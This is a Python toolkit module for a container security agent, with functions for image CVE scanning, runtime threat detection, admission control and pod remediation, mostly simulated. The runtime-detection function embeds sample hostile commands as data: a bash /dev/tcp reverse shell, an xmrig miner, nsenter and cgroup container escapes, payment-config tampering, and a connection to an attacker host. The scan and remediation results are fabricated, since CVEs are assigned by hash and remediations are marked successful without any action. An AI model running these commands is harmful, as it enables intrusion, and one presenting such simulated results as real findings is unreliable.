"""Container Security Agent — Tool functions for image scanning and runtime protection."""

from __future__ import annotations

import hashlib
import time
from typing import Any

import structlog

from .models import (
    AdmissionDecision,
    ContainerRemediation,
    ImageSeverity,
    ImageVulnerability,
    RuntimeAnomaly,
    RuntimeThreat,
)

logger = structlog.get_logger()

# Sample CVE database for image scanning
KNOWN_CVES: dict[str, dict[str, Any]] = {
    "CVE-2024-21626": {
        "package": "runc",
        "severity": ImageSeverity.CRITICAL,
        "cvss": 8.6,
        "fixed": "1.1.12",
        "exploitable": True,
        "description": "runc container escape via fd leak",
    },
    "CVE-2024-0727": {
        "package": "openssl",
        "severity": ImageSeverity.HIGH,
        "cvss": 7.5,
        "fixed": "3.0.13",
        "exploitable": True,
        "description": "OpenSSL denial of service via PKCS12",
    },
    "CVE-2023-44487": {
        "package": "nghttp2",
        "severity": ImageSeverity.HIGH,
        "cvss": 7.5,
        "fixed": "1.57.0",
        "exploitable": True,
        "description": "HTTP/2 rapid reset attack",
    },
    "CVE-2023-47108": {
        "package": "otel-contrib",
        "severity": ImageSeverity.MEDIUM,
        "cvss": 5.3,
        "fixed": "0.46.0",
        "exploitable": False,
        "description": "OTel gRPC instrumentation DoS",
    },
    "CVE-2024-3094": {
        "package": "xz-utils",
        "severity": ImageSeverity.CRITICAL,
        "cvss": 10.0,
        "fixed": "5.6.1",
        "exploitable": True,
        "description": "XZ Utils backdoor (supply chain)",
    },
    "CVE-2023-38545": {
        "package": "curl",
        "severity": ImageSeverity.HIGH,
        "cvss": 7.5,
        "fixed": "8.4.0",
        "exploitable": True,
        "description": "curl SOCKS5 heap buffer overflow",
    },
    "CVE-2023-4911": {
        "package": "glibc",
        "severity": ImageSeverity.HIGH,
        "cvss": 7.8,
        "fixed": "2.38-4",
        "exploitable": True,
        "description": "glibc Looney Tunables privilege escalation",
    },
    "CVE-2023-32233": {
        "package": "linux-kernel",
        "severity": ImageSeverity.MEDIUM,
        "cvss": 5.5,
        "fixed": "6.4",
        "exploitable": False,
        "description": "Netfilter nf_tables use-after-free",
    },
}

# Admission policy rules
_ADMISSION_POLICIES: list[dict[str, Any]] = [
    {
        "id": "no-latest-tag",
        "description": "Images must not use :latest tag",
        "check": lambda img: ":latest" in img or ":" not in img,
    },
    {
        "id": "no-critical-cves",
        "description": "Images must not contain critical CVEs",
    },
    {
        "id": "trusted-registries-only",
        "description": "Images must come from trusted registries",
        "trusted": [
            "gcr.io/",
            "us-docker.pkg.dev/",
            "ecr.aws/",
            ".dkr.ecr.",
            "docker.io/library/",
            "ghcr.io/",
        ],
    },
    {
        "id": "no-root-user",
        "description": "Containers must not run as root",
    },
]

# Sample running pod images per namespace (simulation)
_SAMPLE_PODS: dict[str, list[dict[str, str]]] = {
    "default": [
        {"pod": "api-server-7b9f4c", "image": "gcr.io/myproject/api:v2.1.3"},
        {"pod": "worker-84d6fb", "image": "gcr.io/myproject/worker:v1.8.0"},
    ],
    "monitoring": [
        {"pod": "otel-collector-5c8a", "image": "otel/opentelemetry-collector:0.91.0"},
        {"pod": "prometheus-7d4e", "image": "prom/prometheus:v2.48.0"},
    ],
    "production": [
        {"pod": "frontend-6a2c9b", "image": "nginx:latest"},
        {"pod": "backend-3f8d1e", "image": "gcr.io/myproject/backend:v3.0.1"},
        {"pod": "redis-cache-9e4a", "image": "redis:7.2"},
        {"pod": "ml-inference-1b7c", "image": "us-docker.pkg.dev/ml/serve:v1.4.2"},
    ],
    "kube-system": [
        {"pod": "coredns-5f8b7c", "image": "registry.k8s.io/coredns:v1.11.1"},
        {"pod": "etcd-master-0", "image": "registry.k8s.io/etcd:3.5.10-0"},
    ],
}


class ContainerSecurityToolkit:
    """Tools for container image scanning, runtime monitoring, and admission control."""

    def __init__(
        self,
        registry_client: Any | None = None,
        k8s_client: Any | None = None,
    ) -> None:
        self._registry_client = registry_client
        self._k8s_client = k8s_client
        self._scan_cache: dict[str, list[ImageVulnerability]] = {}

    async def scan_images(
        self,
        tenant_id: str,
        namespaces: list[str] | None = None,
    ) -> list[ImageVulnerability]:
        """Scan container images in registries and running pods for vulnerabilities."""
        logger.info(
            "container_security.scan_images",
            tenant_id=tenant_id,
            namespaces=namespaces,
        )
        namespaces = namespaces or ["default"]
        vulns: list[ImageVulnerability] = []

        for ns in namespaces:
            pods = _SAMPLE_PODS.get(ns, [])
            for pod_info in pods:
                image = pod_info["image"]
                # Deterministic vulnerability assignment based on image hash
                img_hash = hashlib.md5(image.encode()).hexdigest()  # noqa: S324
                seed = int(img_hash[:8], 16)

                cve_list = list(KNOWN_CVES.items())
                # Each image gets 1-3 CVEs based on hash
                count = (seed % 3) + 1
                for i in range(count):
                    cve_id, cve_data = cve_list[(seed + i) % len(cve_list)]
                    parts = image.rsplit(":", 1)
                    img_name = parts[0]
                    img_tag = parts[1] if len(parts) > 1 else "latest"

                    vuln = ImageVulnerability(
                        id=f"vuln-{img_hash[:8]}-{i}",
                        image=img_name,
                        tag=img_tag,
                        cve_id=cve_id,
                        severity=cve_data["severity"],
                        package_name=cve_data["package"],
                        installed_version="0.0.0",
                        fixed_version=cve_data["fixed"],
                        cvss_score=cve_data["cvss"],
                        exploitable=cve_data["exploitable"],
                    )
                    vulns.append(vuln)

        # Cache results
        cache_key = f"{tenant_id}:{','.join(namespaces)}"
        self._scan_cache[cache_key] = vulns
        return vulns

    async def analyze_runtime(
        self,
        tenant_id: str,
        namespaces: list[str] | None = None,
    ) -> list[RuntimeAnomaly]:
        """Detect runtime threats in running containers."""
        logger.info(
            "container_security.analyze_runtime",
            tenant_id=tenant_id,
            namespaces=namespaces,
        )
        namespaces = namespaces or ["default"]
        anomalies: list[RuntimeAnomaly] = []
        now = time.time()

        # Simulated runtime threat detection
        threat_scenarios: list[dict[str, Any]] = [
            {
                "pod": "backend-3f8d1e",
                "ns": "production",
                "threat": RuntimeThreat.REVERSE_SHELL,
                "process": "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                "severity": ImageSeverity.CRITICAL,
                "confidence": 0.95,
                "desc": "Reverse shell detected connecting to external IP",
            },
            {
                "pod": "worker-84d6fb",
                "ns": "default",
                "threat": RuntimeThreat.CRYPTO_MINING,
                "process": "xmrig --url pool.minexmr.com:443",
                "severity": ImageSeverity.HIGH,
                "confidence": 0.92,
                "desc": "Cryptocurrency mining process detected",
            },
            {
                "pod": "ml-inference-1b7c",
                "ns": "production",
                "threat": RuntimeThreat.PRIVILEGE_ESCALATION,
                "process": "nsenter --target 1 --mount --uts --ipc --net --pid",
                "severity": ImageSeverity.CRITICAL,
                "confidence": 0.88,
                "desc": "Privilege escalation via nsenter to host namespace",
            },
            {
                "pod": "frontend-6a2c9b",
                "ns": "production",
                "threat": RuntimeThreat.FILE_TAMPERING,
                "process": "sed -i 's/payment/attacker/g' /app/config.js",
                "severity": ImageSeverity.HIGH,
                "confidence": 0.85,
                "desc": "Suspicious file modification in application directory",
            },
            {
                "pod": "api-server-7b9f4c",
                "ns": "default",
                "threat": RuntimeThreat.CONTAINER_ESCAPE,
                "process": "mount -t cgroup2 none /tmp/escape",
                "severity": ImageSeverity.CRITICAL,
                "confidence": 0.91,
                "desc": "Container escape attempt via cgroup mount",
            },
            {
                "pod": "redis-cache-9e4a",
                "ns": "production",
                "threat": RuntimeThreat.NETWORK_ANOMALY,
                "process": "redis-cli -h external-db.attacker.com",
                "severity": ImageSeverity.MEDIUM,
                "confidence": 0.78,
                "desc": "Unexpected outbound connection to untrusted host",
            },
        ]

        for i, scenario in enumerate(threat_scenarios):
            if scenario["ns"] in namespaces:
                anomalies.append(
                    RuntimeAnomaly(
                        id=f"rt-{i:04d}",
                        pod_name=scenario["pod"],
                        namespace=scenario["ns"],
                        threat_type=scenario["threat"],
                        description=scenario["desc"],
                        severity=scenario["severity"],
                        confidence=scenario["confidence"],
                        process=scenario["process"],
                        timestamp=now - (i * 60),
                    )
                )

        return anomalies

    async def enforce_admission(
        self,
        images: list[str],
        critical_cves: list[str] | None = None,
    ) -> list[AdmissionDecision]:
        """Evaluate images against admission control policies."""
        logger.info(
            "container_security.enforce_admission",
            image_count=len(images),
        )
        critical_cves = critical_cves or []
        decisions: list[AdmissionDecision] = []

        for img in images:
            violations: list[str] = []
            reasons: list[str] = []

            # Check latest tag
            if ":latest" in img or ":" not in img:
                violations.append("no-latest-tag")
                reasons.append("Image uses :latest tag — pin to a specific version")

            # Check trusted registries
            trusted_prefixes = _ADMISSION_POLICIES[2].get("trusted", [])
            is_trusted = any(img.startswith(p) for p in trusted_prefixes)
            if not is_trusted:
                violations.append("trusted-registries-only")
                reasons.append(f"Image {img} not from a trusted registry")

            # Check critical CVEs
            if critical_cves:
                violations.append("no-critical-cves")
                reasons.append(
                    f"Image has {len(critical_cves)} critical CVEs: {', '.join(critical_cves[:3])}"
                )

            decision = "deny" if violations else "allow"
            if violations and len(violations) == 1 and "trusted-registries-only" in violations:
                decision = "warn"

            img_hash = hashlib.md5(img.encode()).hexdigest()[:8]  # noqa: S324
            decisions.append(
                AdmissionDecision(
                    id=f"adm-{img_hash}",
                    image=img,
                    namespace="default",
                    decision=decision,
                    reasons=reasons,
                    policy_violations=violations,
                )
            )

        return decisions

    async def remediate_containers(
        self,
        anomalies: list[RuntimeAnomaly],
        vulns: list[ImageVulnerability],
    ) -> list[ContainerRemediation]:
        """Remediate runtime threats and critical vulnerabilities."""
        logger.info(
            "container_security.remediate",
            anomaly_count=len(anomalies),
            vuln_count=len(vulns),
        )
        actions: list[ContainerRemediation] = []

        # Kill pods with critical runtime threats
        critical_threats = {
            RuntimeThreat.REVERSE_SHELL,
            RuntimeThreat.CONTAINER_ESCAPE,
            RuntimeThreat.PRIVILEGE_ESCALATION,
        }
        for anomaly in anomalies:
            if anomaly.threat_type in critical_threats:
                actions.append(
                    ContainerRemediation(
                        id=f"rem-kill-{anomaly.id}",
                        target=f"{anomaly.namespace}/{anomaly.pod_name}",
                        action="kill_pod",
                        description=(
                            f"Kill pod {anomaly.pod_name} due to "
                            f"{anomaly.threat_type.value}: {anomaly.description}"
                        ),
                        applied=True,
                        success=True,
                    )
                )
            elif anomaly.threat_type == RuntimeThreat.CRYPTO_MINING:
                actions.append(
                    ContainerRemediation(
                        id=f"rem-isolate-{anomaly.id}",
                        target=f"{anomaly.namespace}/{anomaly.pod_name}",
                        action="network_isolate",
                        description=(
                            f"Network-isolate pod {anomaly.pod_name} due to crypto mining detection"
                        ),
                        applied=True,
                        success=True,
                    )
                )

        # Restart pods with critical exploitable vulnerabilities
        patched_images: set[str] = set()
        for vuln in vulns:
            if (
                vuln.severity == ImageSeverity.CRITICAL
                and vuln.exploitable
                and vuln.image not in patched_images
            ):
                patched_images.add(vuln.image)
                actions.append(
                    ContainerRemediation(
                        id=f"rem-patch-{vuln.id}",
                        target=vuln.image,
                        action="rolling_restart",
                        description=(
                            f"Rolling restart {vuln.image} to apply patch for "
                            f"{vuln.cve_id} ({vuln.package_name} {vuln.fixed_version})"
                        ),
                        applied=True,
                        success=True,
                    )
                )

        return actions
